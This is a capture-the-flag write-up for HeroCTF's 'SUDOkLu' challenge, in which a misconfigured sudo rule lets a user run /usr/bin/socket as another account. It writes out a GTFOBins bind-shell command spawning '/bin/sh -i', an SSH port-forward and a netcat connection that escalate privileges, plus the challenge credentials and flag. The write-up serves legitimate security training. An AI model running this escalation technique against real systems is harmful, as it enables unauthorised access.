# SUDOkLu
Category: System

## Description
This is a warmup to get you going. Your task is to read `/home/privilegeduser/flag.txt`. For our new commers, the title might steer you in the right direction ;). Good luck!

Credentials: `user:password123`

\> Deploy on [deploy.heroctf.fr](https://deploy.heroctf.fr/)

Format : **Hero{flag}**

Author : **Log_s**

## Write-up
- Upon accessing the remote server using SSH (`ssh user@dyn-01.heroctf.fr -p 10287`), we attempted to view the permissions of the directory `/home/privilegeduser/` and the flag file `/home/privilegeduser/flag.txt`. Unfortunately, we encountered insufficient permissions and couldn't access them.
- Considering the challenge's name suggested the use of the `sudo` utility, we decided to check our current user's privileges using the `sudo -l` command.
```
Matching Defaults entries for user on sudoklu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User user may run the following commands on sudoklu:
    (privilegeduser) NOPASSWD: /usr/bin/socket
```
- It appeared that our user could execute the `socket` utility as `privilegeduser` through `sudo` without requiring a password.
- Referring to [GTFOBins](https://gtfobins.github.io/gtfobins/socket/), we discovered that we could create a bind shell using the `socket` command. This meant we could create a bind shell by utilizing `privilegeduser` with `sudo` without requiring password.
- The command to create the listener that would spawn a shell is: `sudo -u privilegeduser /usr/bin/socket -svp '/bin/sh -i' 13337`.
- We opened a second terminal to forward local traffic from port `12345` to the server's port `13337` using the command: `ssh -L 12345:127.0.0.1:13337 user@dyn-01.heroctf.fr -p 10287`.
- With the local port forwarding established, we could interact with the server's port `13337` through our local port `12345` by opening a third terminal and running: `nc localhost 12345`.
- By executing these steps, we successfully created a bind shell and established a connection to it. We obtained the flag within the bind shell.

![](solution/image.png)

Flag: `Hero{ch3ck_f0r_m1sc0nf1gur4t1on5}`
